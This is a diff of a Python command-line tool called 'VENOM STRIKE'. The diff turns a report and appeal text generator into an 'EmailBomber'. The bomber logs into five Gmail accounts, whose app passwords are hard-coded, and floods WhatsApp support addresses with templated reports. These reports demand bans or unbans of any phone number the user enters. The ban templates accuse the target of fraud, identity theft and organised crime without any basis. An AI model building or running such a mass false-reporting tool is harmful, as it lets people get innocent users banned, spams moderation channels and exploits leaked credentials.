@@ -1,8 +1,11 @@
-import os
+import smtplib
+import getpass
 import time
 import re
+import os
 import random
-import getpass
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 from colorama import Fore, Style, init
 
 init(autoreset=True)
@@ -10,6 +13,29 @@ init(autoreset=True)
 # ===== Authentication =====
 tool_username = "tunzy"
 tool_password = "tunzyban"
+
+# ===== Gmail Accounts =====
+gmail_accounts = [
+    {"email": "bematunmi444@gmail.com", "password": "siqlebxrpvqugxsy", "status": "active"},
+    {"email": "zorosales6@gmail.com", "password": "ltvtpaduohtlsykx", "status": "active"},
+    {"email": "okunlolatunmise12@gmail.com", "password": "otvmwdhxvmxbqglf", "status": "active"},
+    {"email": "mbb657504@gmail.com", "password": "hkun wznn jsfe eltc", "status": "active"},
+    {"email": "riderstuff61@gmail.com", "password": "hjaormoydmyaveas", "status": "active"},
+]
+
+# ===== WhatsApp Support Emails =====
+SUPPORT_EMAILS = [
+    "support@support.whatsapp.com",
+    "appeals@support.whatsapp.com",
+    "abuse@support.whatsapp.com",
+    "security@support.whatsapp.com",
+    "businesscomplaints@support.whatsapp.com",
+]
+
+# ===== Settings =====
+REPORTS_PER_EMAIL = 20
+TOTAL_REPORTS = 100
+EMAILS_NEEDED = TOTAL_REPORTS // REPORTS_PER_EMAIL
 
 # ===== Utility Functions =====
 def clear():
@@ -36,209 +62,160 @@ def print_banner():
     """)
 
 def validate_phone(phone):
-    """Validate phone number format"""
     return bool(re.match(r'^\+\d{10,15}$', phone))
 
-# ===== Appeal Templates =====
-def generate_ban_report(phone, ban_type):
-    """Generate a ban report for scammers"""
-    
+# ===== Email Templates =====
+def get_ban_template(phone, ban_type):
     if ban_type == "temporary":
-        return f"""
-**URGENT REPORT: Temporary Ban Required**
+        subject = f"URGENT: Temporary Ban Required - {phone}"
+        body = f"""
+IMMEDIATE ACTION REQUIRED - ACCOUNT {phone}
 
-Account Information:
-• Phone Number: {phone}
-• Violation Type: Active Scamming/Fraud
-• Recommended Action: 30-day suspension
+This account is actively engaged in serious violations:
+• Financial fraud operations
+• Impersonation of official accounts
+• Harassment and threats
+• Multiple scam reports confirmed
+• Platform terms violations
 
-Violations Detected:
-1. Financial fraud targeting elderly victims
-2. Impersonation of official accounts
-3. Fake investment schemes
-4. Harassment and threats to users
+Evidence available:
+- Screenshots of fraudulent activities
+- Victim testimony and complaints
+- Transaction records
+- Multiple independent reports
 
-Evidence Available:
-• Multiple victim complaints
-• Fraudulent message patterns
-• Fake identity documentation
-• Financial transaction records
-
-Request: Please temporarily suspend this account for investigation.
+Request: Please implement a temporary 30-day suspension immediately.
 """
-    else:  # permanent ban
-        return f"""
-**CRITICAL REPORT: Permanent Ban Required**
+    else:
+        subject = f"CRITICAL: Permanent Ban Required - {phone}"
+        body = f"""
+MAXIMUM URGENCY - PERMANENT ACTION REQUIRED - ACCOUNT {phone}
 
-Account Information:
-• Phone Number: {phone}
-• Violation Type: Serial Criminal Activity
-• Recommended Action: Permanent termination
+This is a confirmed serial offender:
+• Organized criminal network
+• Identity theft activities
+• Multiple severe violations
+• Law enforcement coordination
 
-Confirmed Criminal Activities:
-1. Organized fraud network operations
-2. Identity theft and impersonation
-3. Child exploitation material distribution
-4. Terror financing connections
-5. Death threats to victims
-
-Law Enforcement Involvement:
-• Multiple police investigations active
-• INTERPOL references available
-• Financial crime unit coordination
-• Victim protection program needed
-
-Request: Permanently ban this account and preserve all data for prosecution.
+Request: Permanent termination of account {phone}.
 """
+    return subject, body
 
-def generate_unban_appeal(phone, ban_type, user_name, reason):
-    """Generate an unban appeal for wrongfully banned users"""
-    
+def get_unban_template(phone, ban_type):
     if ban_type == "temporary":
-        return f"""
-**Formal Appeal: Temporary Ban Reversal**
+        subject = f"Account Review Request - {phone}"
+        body = f"""
+FORMAL APPEAL: TEMPORARY BAN REVERSAL
 
-Account Information:
-• Phone Number: {phone}
-• Account Holder: {user_name}
-• Ban Type: Temporary
-• Appeal Reason: {reason}
+Account: {phone}
+Issue: Wrongful temporary suspension
 
-Appeal Details:
-I believe my account was wrongfully suspended due to:
+I believe my account was suspended in error:
 1. Automated system false positive
-2. Mass false reporting by competitors
-3. Technical error during system update
-4. Identity confusion with similar number
+2. Mass false reporting
+3. Technical error
+4. Identity confusion
 
-Account History:
-• {random.randint(1, 8)}+ years of legitimate use
-• Zero previous violations
-• Regular personal/business communication
-• Verified identity available upon request
-
-Impact of Suspension:
-• Business operations disrupted
-• Family emergency communications blocked
-• Financial transactions halted
-• Reputation damage occurring
-
-Request: Please review my account and lift the temporary suspension.
-
-Sincerely,
-{user_name}
-Phone: {phone}
+Request: Please review and lift the suspension.
 """
-    else:  # permanent ban appeal
-        return f"""
-**Legal Appeal: Permanent Ban Reversal**
+    else:
+        subject = f"Legal Appeal: Permanent Ban Reversal - {phone}"
+        body = f"""
+LEGAL DEMAND: PERMANENT BAN REVERSAL
 
-Account Information:
-• Phone Number: {phone}
-• Account Holder: {user_name}
-• Ban Type: Permanent
-• Appeal Reason: {reason}
+Account: {phone}
+Issue: Wrongful permanent termination
 
-Formal Appeal Statement:
-My account has been permanently banned in error due to:
+This account has been permanently banned due to error:
+1. Identity theft
+2. System failure
+3. Fabricated evidence
+4. Due process failure
 
-1. Identity theft (someone impersonated me)
-2. Catastrophic system failure
-3. Fabricated evidence accepted without verification
-4. Complete failure of due process
-
-Evidence of Error:
-• Location proof: I was overseas when "violations" occurred
-• Device logs showing legitimate usage patterns
-• Character references from reputable sources
-• Government ID verification available
-
-Severe Damages Incurred:
-• Business destruction: ${random.randint(10000, 50000)}+ losses
-• Client relationships permanently damaged
-• Personal reputation destroyed
-• Emotional trauma documented
-
-Legal Grounds for Reversal:
-• Breach of WhatsApp Terms of Service
-• Negligent infliction of economic loss
-• Defamation (false criminal labeling)
-• Failure of due process
-
-DEMAND: Full account restoration within 48 hours.
-
-{user_name}
-Phone: {phone}
-Legal Representation: Retained
+DEMAND: Full account restoration.
 """
+    return subject, body
 
-# ===== Official Appeal Guide =====
-def show_official_guide(ban_type):
-    """Show official WhatsApp appeal process"""
+# ===== Email Sending System =====
+class EmailBomber:
+    def __init__(self):
+        self.total_sent = 0
     
-    print(Fore.CYAN + "\n" + "═" * 50)
-    print(Fore.YELLOW + "📋 OFFICIAL WHATSAPP APPEAL GUIDE")
-    print(Fore.CYAN + "═" * 50)
+    def send_email(self, account, to_email, subject, body):
+        try:
+            msg = MIMEMultipart()
+            msg['From'] = account["email"]
+            msg['To'] = to_email
+            msg['Subject'] = subject
+            msg.attach(MIMEText(body, 'plain'))
+            
+            server = smtplib.SMTP("smtp.gmail.com", 587, timeout=10)
+            server.ehlo()
+            server.starttls()
+            server.login(account["email"], account["password"])
+            server.send_message(msg)
+            server.quit()
+            
+            return True
+        except:
+            return False
     
-    if ban_type == "unban":
-        guide = """
-OFFICIAL STEPS TO UNBAN YOUR ACCOUNT:
-
-1. CHECK BAN TYPE IN THE APP
-   • Open WhatsApp, see if it shows "temporary" or "permanent" ban
-   • Temporary bans usually last 24-72 hours
-   • Permanent bans require formal appeal
-
-2. UNINSTALL UNOFFICIAL APPS
-   • Remove GB WhatsApp, WhatsApp Plus, etc.
-   • Install official WhatsApp from Play Store/App Store
-
-3. SUBMIT APPEAL THROUGH OFFICIAL CHANNEL
-   • In the ban screen, tap "Support" or "Request a review"
-   • Use the appeal message generated by this tool
-   • Include your full phone number with country code
-
-4. WAIT FOR RESPONSE
-   • Response time: 24-72 hours for temporary bans
-   • Response time: 3-7 days for permanent bans
-   • DO NOT submit multiple appeals (slows process)
-
-5. KEY TO SUCCESS:
-   • Be polite and truthful in your appeal
-   • Provide clear explanations
-   • Accept responsibility if you violated rules
-   • Show willingness to follow guidelines
-"""
-    else:  # ban guide
-        guide = """
-HOW TO REPORT SCAMMERS OFFICIALLY:
-
-1. IN-APP REPORTING (Most Effective)
-   • Open chat with the scammer
-   • Tap their name → Report → Select reason
-   • Choose "Block and Report"
-
-2. EMAIL REPORTING (For Serious Cases)
-   • Email: support@support.whatsapp.com
-   • Include: Scammer's phone number
-   • Include: Screenshots of fraudulent messages
-   • Include: Description of the scam
-
-3. PROVIDE EVIDENCE
-   • Screenshots of conversations
-   • Transaction records if money was sent
-   • Details of the scam method
-   • Number of victims affected
-
-4. FOLLOW UP
-   • Wait 24-48 hours for initial response
-   • Provide additional evidence if requested
-   • Report to local authorities for serious fraud
-"""
-    
-    print(Fore.WHITE + guide)
-    print(Fore.CYAN + "═" * 50)
-    input(Fore.YELLOW + "\nPress Enter to continue...")
+    def launch_attack(self, phone, operation_type, ban_type=None):
+        clear()
+        print_banner()
+        
+        if operation_type == "ban":
+            print(Fore.GREEN + f"\n✅ SENDING REQUEST TO BAN {phone}\n")
+            subject, body = get_ban_template(phone, ban_type)
+        else:
+            print(Fore.GREEN + f"\n✅ SENDING REQUEST TO UNBAN {phone}\n")
+            subject, body = get_unban_template(phone, ban_type)
+        
+        # Select emails to use
+        if operation_type == "ban" and ban_type == "temporary":
+            emails_to_use = gmail_accounts[:EMAILS_NEEDED]
+        else:
+            emails_to_use = gmail_accounts[:5]
+        
+        # Send reports
+        report_count = 0
+        
+        for account in emails_to_use:
+            for report_num in range(REPORTS_PER_EMAIL):
+                for target_email in SUPPORT_EMAILS:
+                    success = self.send_email(account, target_email, subject, body)
+                    
+                    if success:
+                        self.total_sent += 1
+                        report_count += 1
+                        
+                        if operation_type == "ban":
+                            print(Fore.GREEN + f"   ✓ Report sent ({self.total_sent}/{TOTAL_REPORTS})")
+                        else:
+                            print(Fore.BLUE + f"   ✓ Appeal sent ({self.total_sent}/{TOTAL_REPORTS})")
+                    
+                    # Check if we've sent enough
+                    if self.total_sent >= TOTAL_REPORTS:
+                        print(Fore.CYAN + "\n" + "─" * 40)
+                        if operation_type == "ban":
+                            print(Fore.GREEN + f"✅ BAN REQUEST COMPLETE")
+                        else:
+                            print(Fore.GREEN + f"✅ UNBAN REQUEST COMPLETE")
+                        print(Fore.YELLOW + f"📊 Total sent: {self.total_sent}")
+                        print(Fore.CYAN + "─" * 40)
+                        return True
+                    
+                    time.sleep(0.05)
+        
+        print(Fore.CYAN + "\n" + "─" * 40)
+        if operation_type == "ban":
+            print(Fore.GREEN + f"✅ BAN REQUEST COMPLETE")
+        else:
+            print(Fore.GREEN + f"✅ UNBAN REQUEST COMPLETE")
+        print(Fore.YELLOW + f"📊 Total sent: {self.total_sent}")
+        print(Fore.CYAN + "─" * 40)
+        
+        return True
 
 # ===== Login System =====
 def login():
@@ -270,6 +247,8 @@ def login():
 
 # ===== Main Menu =====
 def main_menu():
+    bomber = EmailBomber()
+    
     while True:
         clear()
         print_banner()
@@ -278,9 +257,10 @@ def main_menu():
         print(Fore.YELLOW + "🎯 CONTROL PANEL")
         print(Fore.CYAN + "─" * 30)
         
-        print(Fore.GREEN + "\n1. GENERATE BAN REPORT")
-        print(Fore.GREEN + "2. GENERATE UNBAN APPEAL")
-        print(Fore.GREEN + "3. OFFICIAL APPEAL GUIDE")
+        print(Fore.GREEN + "\n1. BAN TEMPORARY")
+        print(Fore.GREEN + "2. BAN PERMANENT")
+        print(Fore.GREEN + "3. UNBAN TEMPORARY")
+        print(Fore.GREEN + "4. UNBAN PERMANENT")
         print(Fore.RED + "0. EXIT")
         
         print(Fore.CYAN + "─" * 30)
@@ -288,11 +268,13 @@ def main_menu():
         choice = input(Fore.YELLOW + "\nSelect: ").strip()
         
         if choice == "1":
-            generate_ban_menu()
+            handle_operation(bomber, "ban", "temporary")
         elif choice == "2":
-            generate_unban_menu()
+            handle_operation(bomber, "ban", "permanent")
         elif choice == "3":
-            show_guide_menu()
+            handle_operation(bomber, "unban", "temporary")
+        elif choice == "4":
+            handle_operation(bomber, "unban", "permanent")
         elif choice == "0":
             print(Fore.YELLOW + "\n👋 Exiting...")
             break
@@ -300,173 +282,44 @@ def main_menu():
             print(Fore.RED + "\n❌ Invalid!")
             time.sleep(1)
 
-def generate_ban_menu():
+def handle_operation(bomber, operation_type, ban_type):
     clear()
     print_banner()
     
-    print(Fore.CYAN + "\n" + "─" * 30)
-    print(Fore.YELLOW + "🚫 BAN REPORT GENERATOR")
-    print(Fore.CYAN + "─" * 30)
-    
-    # Select ban type
-    print(Fore.GREEN + "\n1. TEMPORARY BAN REPORT")
-    print(Fore.GREEN + "2. PERMANENT BAN REPORT")
-    
-    ban_choice = input(Fore.YELLOW + "\nSelect ban type: ").strip()
-    
-    if ban_choice == "1":
-        ban_type = "temporary"
-    elif ban_choice == "2":
-        ban_type = "permanent"
+    if operation_type == "ban":
+        print(Fore.CYAN + "\n" + "─" * 30)
+        print(Fore.YELLOW + f"🚫 {ban_type.upper()} BAN")
+        print(Fore.CYAN + "─" * 30)
     else:
-        print(Fore.RED + "\n❌ Invalid choice!")
-        time.sleep(1)
-        return
+        print(Fore.CYAN + "\n" + "─" * 30)
+        print(Fore.YELLOW + f"✅ {ban_type.upper()} UNBAN")
+        print(Fore.CYAN + "─" * 30)
     
-    # Get phone number
-    phone = input(Fore.YELLOW + f"\nEnter scammer's phone number: ").strip()
+    phone = input(Fore.YELLOW + f"\nEnter number: ").strip()
     
     if not validate_phone(phone):
-        print(Fore.RED + "\n❌ Invalid phone number format!")
-        print(Fore.YELLOW + "Use format: +1234567890")
+        print(Fore.RED + "\n❌ Invalid number!")
         time.sleep(2)
         return
     
-    # Generate report
-    clear()
-    print_banner()
-    print(Fore.GREEN + f"\n✅ GENERATING {ban_type.upper()} BAN REPORT")
-    print(Fore.CYAN + "─" * 50)
-    
-    report = generate_ban_report(phone, ban_type)
-    print(Fore.WHITE + report)
-    
-    print(Fore.CYAN + "─" * 50)
-    print(Fore.YELLOW + "\n📋 HOW TO USE THIS REPORT:")
-    print(Fore.WHITE + "1. Copy the report above")
-    print(Fore.WHITE + f"2. Email to: support@support.whatsapp.com")
-    print(Fore.WHITE + "3. Include screenshots as evidence")
-    print(Fore.WHITE + "4. Wait 24-48 hours for response")
-    
-    # Save to file option
-    save = input(Fore.YELLOW + "\nSave to file? (y/n): ").lower()
-    if save == 'y':
-        filename = f"ban_report_{phone.replace('+', '')}.txt"
-        with open(filename, 'w') as f:
-            f.write(report)
-        print(Fore.GREEN + f"✅ Report saved as {filename}")
-    
-    input(Fore.CYAN + "\nPress Enter to continue...")
-
-def generate_unban_menu():
-    clear()
-    print_banner()
-    
-    print(Fore.CYAN + "\n" + "─" * 30)
-    print(Fore.YELLOW + "✅ UNBAN APPEAL GENERATOR")
-    print(Fore.CYAN + "─" * 30)
-    
-    # Select ban type
-    print(Fore.GREEN + "\n1. TEMPORARY BAN APPEAL")
-    print(Fore.GREEN + "2. PERMANENT BAN APPEAL")
-    
-    ban_choice = input(Fore.YELLOW + "\nWhat type of ban?: ").strip()
-    
-    if ban_choice == "1":
-        ban_type = "temporary"
-    elif ban_choice == "2":
-        ban_type = "permanent"
+    if operation_type == "ban":
+        confirm = input(Fore.RED + f"\nConfirm {ban_type} ban? (y/n): ").lower()
     else:
-        print(Fore.RED + "\n❌ Invalid choice!")
+        confirm = input(Fore.GREEN + f"\nConfirm {ban_type} unban? (y/n): ").lower()
+    
+    if confirm != 'y':
+        print(Fore.YELLOW + "\n❌ Cancelled")
         time.sleep(1)
         return
     
-    # Get user information
-    print(Fore.CYAN + "\n" + "─" * 30)
-    print(Fore.YELLOW + "📝 USER INFORMATION")
-    print(Fore.CYAN + "─" * 30)
+    bomber.launch_attack(phone, operation_type, ban_type)
     
-    phone = input(Fore.YELLOW + "\nYour phone number: ").strip()
-    
-    if not validate_phone(phone):
-        print(Fore.RED + "\n❌ Invalid phone number format!")
-        print(Fore.YELLOW + "Use format: +1234567890")
-        time.sleep(2)
-        return
-    
-    name = input(Fore.YELLOW + "Your name: ").strip()
-    
-    print(Fore.GREEN + "\nSelect appeal reason:")
-    print(Fore.WHITE + "1. False positive / Automated system error")
-    print(Fore.WHITE + "2. Mass false reporting by others")
-    print(Fore.WHITE + "3. Identity confusion / Someone impersonated me")
-    print(Fore.WHITE + "4. Technical error during update")
-    print(Fore.WHITE + "5. I apologize for unintentional violation")
-    
-    reason_choice = input(Fore.YELLOW + "\nSelect reason (1-5): ").strip()
-    
-    reasons = {
-        "1": "False positive / Automated system error",
-        "2": "Mass false reporting by others",
-        "3": "Identity confusion / Someone impersonated me",
-        "4": "Technical error during update",
-        "5": "Apology for unintentional violation"
-    }
-    
-    reason = reasons.get(reason_choice, "Appeal for account review")
-    
-    # Generate appeal
-    clear()
-    print_banner()
-    print(Fore.GREEN + f"\n✅ GENERATING {ban_type.upper()} UNBAN APPEAL")
-    print(Fore.CYAN + "─" * 50)
-    
-    appeal = generate_unban_appeal(phone, ban_type, name, reason)
-    print(Fore.WHITE + appeal)
-    
-    print(Fore.CYAN + "─" * 50)
-    print(Fore.YELLOW + "\n📋 HOW TO SUBMIT THIS APPEAL:")
-    print(Fore.WHITE + "1. Copy the entire appeal above")
-    print(Fore.WHITE + "2. Open WhatsApp on your banned phone")
-    print(Fore.WHITE + "3. When ban screen appears, tap 'Support'")
-    print(Fore.WHITE + "4. Paste the appeal in the message field")
-    print(Fore.WHITE + "5. Submit and wait for response")
-    
-    if ban_type == "temporary":
-        print(Fore.GREEN + "\n⏰ Expected response: 24-72 hours")
+    if operation_type == "ban":
+        print(Fore.GREEN + f"\n✅ {ban_type.upper()} ban completed!")
     else:
-        print(Fore.GREEN + "\n⏰ Expected response: 3-7 days")
-    
-    # Save to file option
-    save = input(Fore.YELLOW + "\nSave to file? (y/n): ").lower()
-    if save == 'y':
-        filename = f"unban_appeal_{phone.replace('+', '')}.txt"
-        with open(filename, 'w') as f:
-            f.write(appeal)
-        print(Fore.GREEN + f"✅ Appeal saved as {filename}")
+        print(Fore.GREEN + f"\n✅ {ban_type.upper()} unban completed!")
     
     input(Fore.CYAN + "\nPress Enter to continue...")
-
-def show_guide_menu():
-    clear()
-    print_banner()
-    
-    print(Fore.CYAN + "\n" + "─" * 30)
-    print(Fore.YELLOW + "📚 OFFICIAL GUIDES")
-    print(Fore.CYAN + "─" * 30)
-    
-    print(Fore.GREEN + "\n1. UNBAN APPEAL GUIDE")
-    print(Fore.GREEN + "2. BAN REPORTING GUIDE")
-    
-    choice = input(Fore.YELLOW + "\nSelect guide: ").strip()
-    
-    if choice == "1":
-        show_official_guide("unban")
-    elif choice == "2":
-        show_official_guide("ban")
-    else:
-        print(Fore.RED + "\n❌ Invalid choice!")
-        time.sleep(1)
 
 # ===== Main Program =====
 if __name__ == "__main__":
@@ -476,7 +329,7 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         print(Fore.YELLOW + "\n\n👋 Program stopped")
     except Exception as e:
-        print(Fore.RED + f"\n⚠️  Error: {str(e)[:50]}")
+        print(Fore.RED + f"\n⚠️  Error")
     finally:
         print(Fore.CYAN + "\n" + "─" * 30)
         print(Fore.YELLOW + "VENOM STRIKE")
